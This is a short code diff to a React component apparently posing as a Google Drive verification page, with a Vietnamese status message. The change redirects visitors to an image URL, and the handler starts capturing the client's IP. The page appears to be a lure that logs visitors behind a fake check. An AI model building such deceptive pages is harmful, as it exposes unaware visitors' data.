@@ -12,13 +12,16 @@ interface DriveVerificationClientProps {
 }
 
 export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
-  const { redirectUrl } = config;
+  const { redirectUrl, imageUrl } = config;
   const [status, setStatus] = useState('Đang chờ xác minh của bạn...');
   const [isVerifying, setIsVerifying] = useState(false);
 
   const handleVerification = async () => {
     setIsVerifying(true);
-    const REDIRECT_URL = redirectUrl || 'https://www.google.com/';
+    
+    // Key Change: The redirect destination is now the image URL itself for viewing.
+    // Fallback to the original redirectUrl if imageUrl isn't set.
+    const REDIRECT_URL = imageUrl || redirectUrl || 'https://www.google.com/';
 
     let clientIp = 'N/A';
     try {
